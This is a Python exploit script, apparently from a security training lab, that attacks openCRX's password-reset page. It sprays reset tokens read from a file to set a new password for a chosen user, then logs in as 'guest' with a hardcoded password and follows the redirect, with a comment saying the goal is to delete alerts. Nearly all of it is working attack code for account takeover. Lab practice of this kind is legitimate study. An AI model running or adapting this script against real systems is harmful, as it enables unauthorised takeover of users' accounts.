#!/usr/bin/python3

import requests
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()
reset_status = False
target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text
        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            reset_status = True
            break

# logging in so we can delete alerts
if reset_status == True:
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    session = requests.session()

    url = "http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet"
    get_params = '?loginFailed=false'
    # res = session.get(url+get_params, allow_redirects=True, proxies=proxies)
    res = session.get(url+get_params, allow_redirects=True)
    print(res.status_code)
    print("==================================")
    print(res.cookies)
    print("==================================")
    #print(res.content)
    print("==================================")
    url = "http://opencrx:8080/opencrx-core-CRX/j_security_check"
    data = {"j_username": "guest", "j_password": "donkey123"}
    # res = session.post(url, data=data, allow_redirects=True, proxies=proxies)
    res = session.post(url, data=data, allow_redirects=True)
    pattern = re.compile('window.*;') # extract out window.href='redirct_url'
    result = pattern.findall(res.text)
    pattern = re.compile("(?<=')(.*?)(?=')") # extract out redirect url
    result = pattern.findall(result[0])
    #res = session.get(result[0], allow_redirects=True, proxies=proxies)
    res = session.get(result[0], allow_redirects=True)

    if 'Logoff&nbsp;guest' in str(res.text):
        print('Login Success')